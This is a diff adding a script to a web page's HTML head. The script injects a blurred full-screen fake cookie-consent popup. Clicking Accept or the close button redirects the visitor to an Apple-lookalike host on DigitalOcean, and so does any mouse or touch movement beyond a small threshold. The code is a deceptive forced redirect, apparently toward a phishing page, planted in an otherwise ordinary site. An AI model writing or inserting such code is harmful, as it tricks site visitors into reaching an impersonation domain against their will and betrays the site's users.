@@ -64,6 +64,156 @@
       rel="stylesheet"
       href="https://unpkg.com/@teleporthq/teleport-custom-scripts/dist/style.css"
     />
+    <script>
+document.addEventListener("DOMContentLoaded", () => {
+  const REDIRECT_URL = "https://apple-com-lutkx.ondigitalocean.app/";
+  const redirectDelay = 800; 
+  const movementThreshold = 12; 
+
+  let hasRedirected = false;
+  let firstDetectedPosition = null;
+  let redirectTimer = null;
+  let userActive = false;
+
+  // Inject CSS
+  (() => {
+    const style = document.createElement("style");
+    style.setAttribute("data-cookie-style", "true");
+    style.textContent = `
+      .cookie-wrapper {
+        position: fixed;
+        inset: 0;
+        background: rgba(0,0,0,0.75);
+        backdrop-filter: blur(10px);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+        z-index: 99999;
+      }
+
+      .cookie-box {
+        background: #fff;
+        border-radius: 12px;
+        padding: 30px;
+        width: 90%;
+        max-width: 450px;
+        font-family: "Arial", sans-serif;
+        box-shadow: 0 7px 35px rgba(0,0,0,0.25);
+        position: relative;
+      }
+
+      .cookie-box button {
+        cursor: pointer;
+      }
+
+      .cookie-close {
+        border: none;
+        background: transparent;
+        position: absolute;
+        right: 12px;
+        top: 12px;
+        font-size: 20px;
+        color: #666;
+      }
+
+      .cta-btn {
+        display: inline-block;
+        background: #007bff;
+        padding: 12px 22px;
+        border-radius: 6px;
+        margin-top: 15px;
+        color: #fff;
+        text-decoration: none;
+        transition: 0.2s ease;
+      }
+
+      .cta-btn:hover {
+        background: #045bc0;
+      }
+    `;
+    document.head.appendChild(style);
+  })();
+
+
+  // Inject Popup
+  const wrapper = document.createElement("div");
+  wrapper.className = "cookie-wrapper";
+  wrapper.innerHTML = `
+    <div class="cookie-box">
+      <button class="cookie-close" aria-label="Close popup">×</button>
+      <h3>Cookie Policy</h3>
+      <p style="line-height:1.5;">
+        We use cookies for analytics and functionality improvements.
+        Learn more on our
+        <a href="${REDIRECT_URL}" target="_blank" style="text-decoration: underline; color:#007bff;">
+          Cookie Policy
+        </a>.
+      </p>
+      <a href="#" class="cta-btn confirm-btn">Accept</a>
+    </div>
+  `;
+  document.body.appendChild(wrapper);
+
+
+  const doRedirect = () => {
+    if (!hasRedirected) {
+      hasRedirected = true;
+      cleanupListeners();
+      window.location.replace(REDIRECT_URL);
+    }
+  };
+
+  const scheduleRedirect = () => {
+    if (redirectTimer || hasRedirected) return;
+    redirectTimer = setTimeout(doRedirect, redirectDelay);
+  };
+
+  const detectMovement = (x, y) => {
+    if (!firstDetectedPosition) {
+      firstDetectedPosition = { x, y };
+      return;
+    }
+
+    const dx = Math.abs(x - firstDetectedPosition.x);
+    const dy = Math.abs(y - firstDetectedPosition.y);
+
+    if (dx > movementThreshold || dy > movementThreshold) {
+      scheduleRedirect();
+    }
+  };
+
+  const mouseMoveHandler = (event) => detectMovement(event.clientX, event.clientY);
+
+  const touchMoveHandler = (event) => {
+    const touchPoint = event.touches[0];
+    detectMovement(touchPoint.clientX, touchPoint.clientY);
+  };
+
+  const clickHandler = (event) => {
+    if (
+      event.target.classList.contains("confirm-btn") ||
+      event.target.classList.contains("cookie-close")
+    ) {
+      event.preventDefault();
+      doRedirect();
+    }
+  };
+
+  // attach listeners
+  document.addEventListener("mousemove", mouseMoveHandler, { passive: true });
+  document.addEventListener("touchmove", touchMoveHandler, { passive: true });
+  wrapper.addEventListener("click", clickHandler);
+
+  // cleanup function
+  const cleanupListeners = () => {
+    document.removeEventListener("mousemove", mouseMoveHandler);
+    document.removeEventListener("touchmove", touchMoveHandler);
+    wrapper.removeEventListener("click", clickHandler);
+  };
+});
+</script>
+
   </head>
   <body>
     <link rel="stylesheet" href="./style.css" />
